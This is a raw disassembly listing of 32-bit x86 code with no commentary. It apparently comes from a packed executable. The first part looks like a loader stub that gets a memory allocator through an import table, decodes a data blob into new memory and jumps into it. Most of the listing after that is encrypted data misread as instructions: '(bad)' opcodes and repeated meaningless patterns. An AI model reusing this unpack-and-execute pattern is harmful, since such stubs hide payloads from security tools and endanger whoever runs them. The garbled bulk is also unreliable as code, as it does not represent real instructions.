  415305:	mov    BYTE PTR [ebp-0x34],0x0
  415309:	mov    DWORD PTR [ebp-0x8],0xcc13390c
  415310:	mov    DWORD PTR [ebp-0x68],0x122d67
  415317:	jmp    0x41532e
  415319:	mov    BYTE PTR ds:0x417038,0x0
  415320:	push   0x42cfc8
  415325:	call   DWORD PTR ds:0x417018
  41532b:	mov    DWORD PTR [ebp-0x2c],eax
  41532e:	push   0x0
  415330:	call   DWORD PTR ds:0x417018
  415336:	mov    DWORD PTR [ebp-0x2c],eax
  415339:	push   DWORD PTR ds:0x417018
  41533f:	pop    edx
  415340:	mov    DWORD PTR [ebp-0x6c],edx
  415343:	lea    edx,[ebp-0x40]
  415346:	push   edx
  415347:	mov    eax,DWORD PTR [ebp-0x60]
  41534a:	push   eax
  41534b:	call   DWORD PTR ds:0x417024
  415351:	mov    DWORD PTR [ebp-0x44],eax
  415354:	push   DWORD PTR [ebp-0x30]
  415357:	push   0x1000
  41535c:	mov    eax,DWORD PTR [ebp-0x14]
  41535f:	add    eax,0x23
  415362:	add    eax,0x23
  415365:	push   eax
  415366:	xor    eax,eax
  415368:	push   eax
  415369:	mov    ecx,DWORD PTR [ebp-0x44]
  41536c:	call   ecx
  41536e:	push   eax
  41536f:	pop    ecx
  415370:	mov    DWORD PTR [ebp-0x4],ecx
  415373:	mov    ecx,DWORD PTR [ebp-0x68]
  415376:	sub    ecx,0xdae0b
  41537c:	mov    DWORD PTR [ebp-0x68],ecx
  41537f:	cmp    DWORD PTR [ebp-0x4],0x0
  415383:	jne    0x41539d
  415385:	push   0x0
  415387:	push   0x0
  415389:	call   0x416a5c
  41538e:	push   0x0
  415390:	call   DWORD PTR ds:0x41702c
  415396:	mov    BYTE PTR ds:0x447f40,0x0
  41539d:	mov    edx,DWORD PTR [ebp-0x4]
  4153a0:	add    edx,DWORD PTR [ebp-0x14]
  4153a3:	mov    eax,DWORD PTR [ebp-0x8]
  4153a6:	mov    DWORD PTR [edx],eax
  4153a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4153ab:	add    ecx,DWORD PTR [ebp-0x54]
  4153ae:	mov    DWORD PTR [ebp-0x5c],ecx
  4153b1:	mov    edx,DWORD PTR ds:0x417024
  4153b7:	mov    DWORD PTR [ebp-0x4c],edx
  4153ba:	mov    eax,DWORD PTR [ebp-0x4]
  4153bd:	add    eax,DWORD PTR [ebp-0x14]
  4153c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4153c3:	mov    DWORD PTR [eax+0x4],ecx
  4153c6:	mov    edx,DWORD PTR [ebp-0x4]
  4153c9:	add    edx,DWORD PTR [ebp-0x14]
  4153cc:	mov    DWORD PTR [ebp-0xc],edx
  4153cf:	cmp    DWORD PTR [ebp-0x68],0x0
  4153d3:	jbe    0x4153f0
  4153d5:	mov    eax,DWORD PTR [ebp-0xc]
  4153d8:	push   eax
  4153d9:	mov    ecx,DWORD PTR [ebp-0x14]
  4153dc:	push   ecx
  4153dd:	mov    edx,DWORD PTR [ebp-0x2c]
  4153e0:	add    edx,DWORD PTR [ebp-0x68]
  4153e3:	push   edx
  4153e4:	mov    eax,DWORD PTR [ebp-0x4]
  4153e7:	push   eax
  4153e8:	call   0x41696e
  4153ed:	add    esp,0x10
  4153f0:	cmp    DWORD PTR [ebp-0x5c],0x0
  4153f4:	je     0x415404
  4153f6:	push   DWORD PTR [ebp-0x4c]
  4153f9:	push   DWORD PTR [ebp-0x6c]
  4153fc:	mov    ecx,DWORD PTR [ebp-0x5c]
  4153ff:	push   ecx
  415400:	jmp    ecx
  415402:	jmp    0x41540a
  415404:	mov    ecx,DWORD PTR [ebp+0x8]
  415407:	mov    DWORD PTR [ebp-0x18],ecx
  41540a:	mov    eax,0x1
  41540f:	mov    esp,ebp
  415411:	pop    ebp
  415412:	ret    
  415413:	push   ebp
  415414:	mov    ebp,esp
  415416:	pop    ebp
  415417:	ret    
  415418:	push   ebp
  415419:	mov    ebp,esp
  41541b:	sub    esp,0x54
  41541e:	mov    DWORD PTR [ebp-0x34],0x0
  415425:	mov    DWORD PTR [ebp-0x4],0x0
  41542c:	mov    DWORD PTR [ebp-0x50],0x0
  415433:	mov    DWORD PTR [ebp-0x4c],0x0
  41543a:	mov    DWORD PTR [ebp-0x30],0x0
  415441:	lea    eax,[ebp-0x38]
  415444:	push   eax
  415445:	push   0x8
  415447:	call   DWORD PTR ds:0x417020
  41544d:	call   DWORD PTR ds:0x417014
  415453:	mov    DWORD PTR [ebp-0x30],eax
  415456:	lea    ecx,[ebp-0x48]
  415459:	push   ecx
  41545a:	call   DWORD PTR ds:0x417010
  415460:	mov    edx,DWORD PTR [ebp-0x34]
  415463:	push   edx
  415464:	call   0x415493
  415469:	add    esp,0x4
  41546c:	call   0x41695f
  415471:	mov    DWORD PTR [ebp-0x54],0x0
  415478:	jmp    0x415483
  41547a:	mov    eax,DWORD PTR [ebp-0x54]
  41547d:	add    eax,0x1
  415480:	mov    DWORD PTR [ebp-0x54],eax
  415483:	cmp    DWORD PTR [ebp-0x54],0x64
  415487:	jae    0x41548b
  415489:	jmp    0x41547a
  41548b:	xor    eax,eax
  41548d:	mov    esp,ebp
  41548f:	pop    ebp
  415490:	ret    0x10
  415493:	push   ebp
  415494:	mov    ebp,esp
  415496:	sub    esp,0x3c
  415499:	push   esi
  41549a:	mov    DWORD PTR [ebp-0x3c],0x0
  4154a1:	mov    DWORD PTR [ebp-0x38],0x0
  4154a8:	mov    DWORD PTR [ebp-0x30],0x0
  4154af:	mov    DWORD PTR [ebp-0x24],0x0
  4154b6:	mov    DWORD PTR [ebp-0x1c],0x0
  4154bd:	mov    DWORD PTR [ebp-0x28],0x0
  4154c4:	mov    DWORD PTR [ebp-0x2c],0x448fc8
  4154cb:	mov    DWORD PTR [ebp-0x24],0x10b695a1
  4154d2:	mov    DWORD PTR [ebp-0x34],0x0
  4154d9:	mov    eax,DWORD PTR [ebp-0x24]
  4154dc:	mov    DWORD PTR [ebp-0x20],eax
  4154df:	mov    DWORD PTR [ebp-0x4],0x0
  4154e6:	mov    ecx,DWORD PTR ds:0x417014
  4154ec:	mov    DWORD PTR [ebp-0x4],ecx
  4154ef:	push   0x0
  4154f1:	push   0x4e
  4154f3:	push   0x1e
  4154f5:	push   0x0
  4154f7:	push   0xffffffff
  4154f9:	call   DWORD PTR ds:0x41701c
  4154ff:	test   eax,eax
  415501:	je     0x41693e
  415507:	(bad)  
  415508:	inc    esi
  415509:	lahf   
  41550a:	sub    bp,WORD PTR ds:[edi-0x14f734a7]
  415512:	(bad)  [ebx+0x64]
  415515:	sbb    al,0xf
  415517:	fidivr WORD PTR ds:0xcf59af2b
  41551d:	or     bl,ch
  41551f:	fwait
  415520:	pushf  
  415521:	fwait
  415522:	sbb    al,0xf
  415524:	cmp    ax,0xaf2b
  415528:	pop    ecx
  415529:	iret   
  41552a:	or     bl,ch
  41552c:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415533:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415539:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415540:	sub    ebp,DWORD PTR [edi-0x14f638a7]
  415546:	fist   DWORD PTR [edx+0x6601a684]
  41554c:	mov    DWORD PTR [edx],esp
  41554e:	bound  edi,QWORD PTR [eax+0x77]
  415551:	or     DWORD PTR [edi+0x74cfbd16],esp
  415557:	adc    ax,0x5b1d
  41555b:	fnsave [esi]
  41555d:	test   al,0x7a
  41555f:	mov    dh,BYTE PTR [esi+0x617df8bc]
  415565:	or     BYTE PTR [edx+0x5f],dl
  415568:	(bad)  
  415569:	cmp    ebp,DWORD PTR [edx-0xd5166d8]
  41556f:	mov    ebx,0x79466175
  415574:	fs cld 
  415576:	jns    0x41551a
  415578:	addr16 (bad) 
  41557a:	mov    esi,0x51196b2
  41557f:	inc    edx
  415580:	cmp    eax,0xcf59af2b
  415585:	or     bl,ch
  415587:	mov    eax,ds:0x31928d53
  41558c:	enter  0xf645,0x91
  415590:	div    DWORD PTR [edi-0x1b8a2a2b]
  415596:	inc    esi
  415597:	cmp    DWORD PTR [eax+eax*4],edi
  41559a:	loopne 0x4155a5
  41559c:	add    DWORD PTR [ecx],esp
  41559e:	adc    ch,BYTE PTR ds:0x244109d8
  4155a4:	mov    dl,0x77
  4155a6:	mov    ebx,0x847c1818
  4155ab:	fisub  DWORD PTR [esi+0x43cd0693]
  4155b1:	iret   
  4155b2:	rcr    BYTE PTR [ebp-0x6d],cl
  4155b5:	push   ebx
  4155b6:	jb     0x415626
  4155b8:	sbb    ebx,esi
  4155ba:	ss in  al,dx
  4155bc:	xor    ah,bl
  4155be:	sar    DWORD PTR [eax],0xb0
  4155c1:	(bad)  
  4155c2:	test   BYTE PTR [edx-0x2a2a4809],0x75
  4155c9:	in     eax,0x46
  4155cb:	push   ebp
  4155cc:	mov    al,ds:0x21e9e01e
  4155d1:	xor    edx,DWORD PTR [edx]
  4155d3:	cmp    BYTE PTR [ebp-0x5d],al
  4155d6:	inc    ecx
  4155d7:	mov    esi,0x44bbd82f
  4155dc:	test   edi,edx
  4155de:	test   dl,ch
  4155e0:	cmp    ecx,DWORD PTR [ecx]
  4155e2:	push   es
  4155e3:	mov    ds:0x43d26435,eax
  4155e8:	push   cs
  4155e9:	into   
  4155ea:	jb     0x415652
  4155ec:	popa   
  4155ed:	jo     0x415625
  4155ef:	mov    ebp,esi
  4155f1:	clc    
  4155f2:	je     0x415625
  4155f4:	enter  0xf645,0xaf
  4155f8:	pop    ecx
  4155f9:	iret   
  4155fa:	or     bl,ch
  4155fc:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415603:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415609:	fistp  DWORD PTR [ebx+ebx*4+0x6d660f1c]
  415610:	outs   dx,BYTE PTR ds:[esi]
  415611:	scas   eax,DWORD PTR es:[edi]
  415612:	pop    ecx
  415613:	or     DWORD PTR [ecx],0xffffffe8
  415616:	(bad)  
  415618:	aad    0x51
  41561a:	inc    eax
  41561b:	cmp    ax,0xaf2b
  41561f:	pop    ecx
  415620:	iret   
  415621:	or     bl,ch
  415623:	cmp    ebx,DWORD PTR [ecx+ebx*4+0x3767041d]
  41562a:	sub    ebp,DWORD PTR [edi-0x14f73445]
  415630:	pop    edi
  415631:	call   0x683d:0x660f1c9b
  415638:	adc    bl,BYTE PTR [ecx-0x31]
  41563b:	or     bl,bh
  41563d:	fistp  DWORD PTR [ebx+ebx*4+0x3d660a1c]
  415644:	sub    ebp,edi
  415646:	pop    ecx
  415647:	iret   
  415648:	sbb    bl,ch
  41564a:	fistp  DWORD PTR [ecx+ebx*4+0x3d630f1c]
  415651:	sub    ch,BYTE PTR [edi-0x14f730a7]
  415657:	ficomp WORD PTR [edx+ebx*4+0x3d660f1c]
  41565e:	sub    ebp,DWORD PTR [edi-0x14f73c97]
  415664:	fistp  WORD PTR [ebx+ebx*4+0x3d62f116]
  41566b:	sub    DWORD PTR [edi-0x14f7b1e7],ebp
  415671:	retf   
  415672:	pushf  
  415673:	fwait
  415674:	or     al,0xf
  415676:	cmp    ax,0xbf2b
  41567a:	pop    ecx
  41567b:	iret   
  41567c:	sbb    bl,ch
  41567e:	fistp  DWORD PTR [ebx+ebx*4+0x3d760f1c]
  415685:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41568b:	fistp  DWORD PTR [ebx+ebx*4+0x31660b1c]
  415692:	sub    esi,esi
  415694:	pop    edx
  415695:	iret   
  415696:	or     bl,ch
  415698:	sbb    edx,DWORD PTR [edi+0x6630499b]
  41569e:	cmp    eax,0xcf59af2b
  4156a3:	or     bl,ch
  4156a5:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4156ac:	sub    ebp,DWORD PTR [edi-0x18d730a7]
  4156b2:	fild   DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4156b9:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4156bf:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4156c6:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4156cc:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4156d3:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4156d9:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4156e0:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4156e6:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4156ed:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4156f3:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4156fa:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415700:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415707:	add    eax,0x7cb73cdb
  41570c:	jmp    0x4156e9
  41570e:	pushf  
  41570f:	fwait
  415710:	lods   al,BYTE PTR ds:[esi]
  415711:	add    al,0x66
  415713:	cmp    eax,0xcf59af3b
  415718:	outs   dx,BYTE PTR ds:[esi]
  415719:	out    dx,eax
  41571a:	fistp  DWORD PTR [edi+ebx*4+0x78360f1c]
  415721:	push   0x8800d9d
  415726:	jmp    0x415703
  415728:	pushf  
  415729:	fwait
  41572a:	sbb    al,0x2f
  41572c:	cmp    ax,0x81cb
  415730:	sub    edi,DWORD PTR [edx+edi*2-0x64632478]
  415737:	sbb    al,0x6f
  415739:	cmp    ax,0x6f2b
  41573d:	push   edx
  41573e:	iret   
  41573f:	or     BYTE PTR [ecx+0x769b9cdb],bh
  415745:	or     esp,DWORD PTR [esi+0x3d]
  415748:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41574e:	fistp  DWORD PTR [ebx+ebx*4+0x3d460f1c]
  415755:	sub    ecx,DWORD PTR [edi+0x77]
  415758:	mov    ebp,0xffb4876d
  41575d:	fwait
  41575e:	sbb    al,0xf
  415760:	fs cmp eax,0xc379af2b
  415766:	or     bl,ch
  415768:	fstp   DWORD PTR [ebx+ebx*4+0x3d62b31c]
  41576f:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415775:	fistp  DWORD PTR [ebx+ebx*4+0x7d660f1c]
  41577c:	sub    ebp,DWORD PTR [edi-0x14f73067]
  415782:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415789:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41578f:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415796:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41579c:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157a3:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4157a9:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157b0:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4157b6:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157bd:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4157c3:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157ca:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4157d0:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157d7:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4157dd:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157e4:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4157ea:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157f1:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4157f7:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4157fe:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415804:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  41580b:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415811:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415818:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41581e:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415825:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41582b:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415832:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415838:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  41583f:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415845:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  41584c:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415852:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415859:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41585f:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415866:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  41586c:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415873:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415879:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415880:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415886:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  41588d:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  415893:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  41589a:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158a0:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4158a7:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158ad:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4158b4:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158ba:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4158c1:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158c7:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4158ce:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158d4:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4158db:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158e1:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4158e8:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158ee:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  4158f5:	sub    ebp,DWORD PTR [edi-0x14f730a7]
  4158fb:	fistp  DWORD PTR [ebx+ebx*4+0x3d660f1c]
  415902:	sub    ebp,DWORD PTR [edi+0x4008cf59]
  415908:	xchg   ebp,eax
  415909:	xchg   edi,eax
  41590a:	fwait
  41590b:	xor    ecx,DWORD PTR [edi]
  41590d:	sub    ax,0xaf2b
  415911:	jae    0x415980
  415913:	rcr    BYTE PTR [edi+0xea8d366],cl
  415919:	and    al,0x5d
  41591b:	add    ah,al
  41591d:	sbb    cl,bl
  41591f:	leave  
  415920:	inc    ecx
  415921:	mov    dl,0x2a
  415923:	inc    eax
  415924:	sub    BYTE PTR [edi],cl
  415926:	dec    eax
  415927:	pop    ebp
  415928:	aam    0xf3
  41592a:	and    al,0x1b
  41592c:	mov    esi,0xb9411ca
  415931:	(bad)
  415934:	es pop esi
  415936:	inc    esi
  415937:	dec    esp
  415938:	loop   0x415958
  41593a:	sub    eax,0x1b14d2a8
  41593f:	or     esi,edx
  415941:	inc    esi
  415942:	add    al,0x13
  415944:	in     al,dx
  415945:	pop    ebx
  415946:	or     DWORD PTR [edi+0x33],0x47
  41594a:	dec    ebx
  41594b:	aam    0x22
  41594d:	mov    esp,0xb832c990
  415952:	pop    ss
  415953:	ds pop edx
  415955:	test   BYTE PTR [edi+0x7b],al
  415958:	mov    eax,DWORD PTR [ebx-0x79f83301]
  41595e:	sub    dl,BYTE PTR [edx]
  415960:	xor    esp,DWORD PTR [edx+0xcbd3d04]
  415966:	shr    dh,0xfd
  415969:	sbb    bh,BYTE PTR [ecx-0x66]
  41596c:	pop    ebp
  41596d:	(bad)  
  41596e:	std    
  41596f:	int    0xbf
  415971:	and    DWORD PTR [ecx+eiz*2+0x37],esi
  415975:	xor    ecx,DWORD PTR [edx-0x28f72c21]
  41597b:	adc    dh,bh
  41597d:	mov    esi,0x2c38113e
  415982:	hlt    
  415983:	fnstenv [eax-0x1429dd33]
  415989:	jl     0x41598a
  41598b:	leave  
  41598c:	or     esi,DWORD PTR [edi+0x4d4ffbfd]
  415992:	mov    DWORD PTR [edi],ecx
  415994:	push   ecx
  415995:	mov    WORD PTR [esi-0x64],?
  415998:	adc    eax,0x46302862
  41599d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41599e:	pop    ebp
  41599f:	or     DWORD PTR [edx+0x3c],0xffffffdf
  4159a3:	fdivrp st(5),st
  4159a5:	xchg   ch,bl
  4159a7:	ds hlt 
  4159a9:	ds mul edx
  4159ac:	pusha  
  4159ad:	stos   BYTE PTR es:[edi],al
  4159ae:	mov    BYTE PTR gs:[edi],0xe
  4159b2:	test   al,0xc7
  4159b4:	push   0xef007bce
  4159b9:	test   al,dh
  4159bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159bc:	mov    esp,0x5e145603
  4159c1:	retf   
  4159c2:	sub    al,0xa
  4159c4:	or     eax,0x6c00078c
  4159c9:	out    dx,eax
  4159ca:	js     0x415a02
  4159cc:	sub    al,0xc4
  4159ce:	je     0x76c53a21
  4159d4:	cs push es
  4159d6:	pop    eax
  4159d7:	push   ecx
  4159d8:	dec    edx
  4159d9:	popf   
  4159da:	push   ebx
  4159db:	jg     0x41598c
  4159dd:	loop   0x415a0f
  4159df:	inc    eax
  4159e0:	pop    ebp
  4159e1:	pop    esp
  4159e2:	in     eax,dx
  4159e3:	addr16 pop ds
  4159e5:	inc    ecx
  4159e6:	ja     0x415994
  4159e8:	jg     0x4159c0
  4159ea:	daa    
  4159eb:	aam    0xa3
  4159ed:	inc    edi
  4159ee:	xchg   ebp,eax
  4159ef:	arpl   WORD PTR [edi],dx
  4159f1:	imul   edx,DWORD PTR [ebp+0x4],0x7d
  4159f5:	xor    al,0x89
  4159f7:	mov    edx,0x97de6d00
  4159fc:	jne    0x4159ad
  4159fe:	xor    BYTE PTR [edi+0x56],0x7d
  415a02:	xor    eax,edx
  415a04:	push   esi
  415a05:	jmp    0x2236c518
  415a0a:	xchg   edx,eax
  415a0b:	adc    eax,0xf34a934
  415a10:	push   cs
  415a11:	mov    WORD PTR [edi],?
  415a13:	jmp    0x415a1f
  415a15:	out    0xd,eax
  415a17:	in     eax,dx
  415a18:	dec    ebx
  415a19:	fist   DWORD PTR [esi-0x4f]
  415a1c:	rcr    BYTE PTR [eax+ebx*2],1
  415a1f:	dec    edx
  415a20:	bound  esi,QWORD PTR [ebp-0xe]
  415a23:	cmp    BYTE PTR [edi],0x86
  415a26:	and    cl,BYTE PTR fs:[eax-0x3e]
  415a2a:	call   0xed0:0x562a5db3
  415a31:	enter  0xb25b,0x39
  415a35:	xlat   BYTE PTR ds:[ebx]
  415a36:	js     0x415a0d
  415a38:	and    eax,esp
  415a3a:	and    edi,ecx
  415a3c:	scas   eax,DWORD PTR es:[edi]
  415a3d:	lods   eax,DWORD PTR ds:[esi]
  415a3e:	push   cs
  415a3f:	cwde   
  415a40:	pop    es
  415a41:	or     al,0xdf
  415a43:	(bad)  
  415a44:	std    
  415a45:	xchg   edi,eax
  415a46:	sar    DWORD PTR [edi-0x27],1
  415a49:	xchg   esp,eax
  415a4a:	jae    0x415a05
  415a4c:	cmp    ebp,DWORD PTR [esp+ecx*4-0x21236e73]
  415a53:	fstp   QWORD PTR [edi]
  415a55:	xor    dl,BYTE PTR [edx]
  415a57:	mov    ecx,edx
  415a59:	add    BYTE PTR [ebp-0x15],dh
  415a5c:	out    dx,al
  415a5d:	(bad)  
  415a5e:	in     al,dx
  415a5f:	ds sti 
  415a61:	cmc    
  415a62:	div    DWORD PTR [esi+0x42]
  415a65:	xchg   ch,dl
  415a67:	scas   al,BYTE PTR es:[edi]
  415a68:	xor    DWORD PTR [ebx-0x7c],eax
  415a6b:	xchg   ebp,eax
  415a6c:	xor    bh,BYTE PTR [ecx-0x33]
  415a6f:	inc    ebx
  415a70:	sub    eax,0xb3cc8640
  415a75:	aad    0x0
  415a77:	int3   
  415a78:	test   BYTE PTR [ecx],ch
  415a7a:	lds    ebx,FWORD PTR [ebp+0x52f064d7]
  415a80:	cmp    edi,DWORD PTR [ebx-0x5]
  415a83:	jae    0x415a77
  415a85:	pop    ebp
  415a86:	sbb    edi,DWORD PTR [ebx]
  415a88:	vcvtss2si ebp,DWORD PTR ds:0x880670d8
  415a90:	push   es
  415a91:	icebp  
  415a92:	std    
  415a93:	enter  0xd672,0xd9
  415a97:	xchg   esp,eax
  415a98:	cmp    al,0x58
  415a9a:	fild   DWORD PTR [edx]
  415a9c:	js     0x415aee
  415a9e:	xor    esp,ebx
  415aa0:	inc    edx
  415aa2:	int    0xd4
  415aa4:	lea    esi,[edi+0xb]
  415aa7:	test   eax,0x554ae211
  415aac:	int3   
  415aad:	loop   0x415aa9
  415aaf:	mov    ecx,0x114bde62
  415ab4:	mov    bh,0xbf
  415ab6:	ss (bad) 
  415ab8:	in     eax,dx
  415ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aba:	aam    0xfe
  415abc:	push   ebp
  415abd:	sub    al,0xa7
  415abf:	and    eax,0x3a25b68a
  415ac4:	cdq    
  415ac5:	mov    eax,0x2b1d1357
  415aca:	jp     0x415a7f
  415acc:	cwde   
  415acd:	outs   dx,DWORD PTR ds:[esi]
  415ace:	(bad)
  415ad2:	inc    ebx
  415ad3:	jne    0x415b10
  415ad5:	xchg   ecx,eax
  415ad6:	cmc    
  415ad7:	xchg   ch,ah
  415ad9:	sbb    BYTE PTR [ecx],cl
  415adb:	ror    BYTE PTR ds:0x6007db72,cl
  415ae1:	jb     0x415acc
  415ae3:	aad    0x83
  415ae5:	rdtsc  
  415ae7:	aas    
  415ae8:	in     eax,0xd3
  415aea:	add    al,BYTE PTR [ecx]
  415aec:	fs sub esp,esi
  415aef:	aas    
  415af0:	xor    eax,0x1d4b8f61
  415af5:	xor    BYTE PTR ds:[esi],0xac
  415af9:	push   cs
  415afa:	shl    BYTE PTR [ecx+0x47],0xc1
  415afe:	scas   eax,DWORD PTR es:[edi]
  415aff:	pushf  
  415b00:	jecxz  0x415b57
  415b02:	dec    eax
  415b03:	lds    edi,FWORD PTR [ebx-0x498c7438]
  415b09:	pop    es
  415b0a:	push   esp
  415b0b:	push   0xffffffab
  415b0d:	sub    al,0xbb
  415b0f:	jle    0x415b2f
  415b11:	mov    ebp,0xedd5ecc8
  415b16:	ror    dl,1
  415b18:	iret   
  415b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b1a:	sbb    edi,edx
  415b1c:	out    dx,al
  415b1d:	addr16 iret 
  415b1f:	and    esp,DWORD PTR [ecx-0x7c]
  415b22:	add    al,0x7
  415b24:	pop    ds
  415b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b26:	jecxz  0x415b82
  415b28:	mov    ebp,0x42995138
  415b2d:	retf   
  415b2e:	bound  edi,QWORD PTR [ebp+0x66]
  415b31:	shl    DWORD PTR [eax-0x31487343],0x7
  415b38:	jl     0x415b44
  415b3a:	ffreep st(7)
  415b3c:	es jl  0x415b37
  415b3f:	outs   dx,DWORD PTR ds:[esi]
  415b40:	sub    dl,BYTE PTR [ebx+0x2672f8bb]
  415b46:	xor    eax,esp
  415b48:	hlt    
  415b49:	inc    edi
  415b4a:	stos   DWORD PTR es:[edi],eax
  415b4b:	cmc    
  415b4c:	scas   eax,DWORD PTR es:[edi]
  415b4d:	cs dec esp
  415b4f:	sub    al,0xe2
  415b51:	xor    bl,cl
  415b53:	mov    al,0xba
  415b55:	mov    esp,0x88b686fe
  415b5a:	into   
  415b5b:	add    ah,BYTE PTR [edi+0x53]
  415b5e:	sub    bh,ch
  415b60:	jle    0x415b57
  415b62:	dec    ecx
  415b63:	push   ss
  415b64:	outs   dx,DWORD PTR ds:[esi]
  415b65:	(bad)  
  415b67:	cmp    BYTE PTR [ebx-0x309d7c6],0xd5
  415b6e:	xor    DWORD PTR [ebx+ebx*4+0x4c1392c1],ebx
  415b75:	jnp    0x415b42
  415b77:	jne    0x415b7b
  415b79:	jmp    0x674f:0x5665562f
  415b80:	out    0xe8,eax
  415b82:	jp     0x415b11
  415b84:	mov    BYTE PTR [edx],bl
  415b86:	mov    al,0x59
  415b88:	lea    esp,[ecx+ebp*2+0x58]
  415b8c:	mov    cl,dl
  415b8e:	sbb    eax,0xacab2493
  415b93:	jmp    DWORD PTR [eax-0x7a47d065]
  415b99:	jmp    0x64b09c9f
  415b9e:	aas    
  415b9f:	xor    eax,0x7a3359e7
  415ba4:	mov    dl,0xcb
  415ba6:	and    esi,ebp
  415ba8:	lods   al,BYTE PTR ds:[esi]
  415ba9:	les    edi,FWORD PTR [ebx]
  415bab:	sbb    esi,DWORD PTR ds:0x4b1518f
  415bb1:	addr16 pop ebp
  415bb3:	adc    DWORD PTR [edi-0x101017ad],0x463817ca
  415bbd:	pop    ecx
  415bbe:	fnstcw WORD PTR [ebx-0x45]
  415bc1:	mov    esp,ebp
  415bc3:	push   es
  415bc4:	nop
  415bc5:	adc    esi,DWORD PTR [ebx]
  415bc7:	icebp  
  415bc8:	push   es
  415bc9:	inc    eax
  415bca:	sub    DWORD PTR ds:0x8bc5f942,esp
  415bd0:	fsub   DWORD PTR [ebp+0x4b6ca229]
  415bd6:	mov    bh,0x20
  415bd8:	ins    BYTE PTR es:[edi],dx
  415bd9:	dec    esp
  415bda:	ffreep st(0)
  415bdc:	(bad)  
  415bde:	adc    ebx,DWORD PTR [ebx+edx*4-0xdb098b]
  415be5:	sahf   
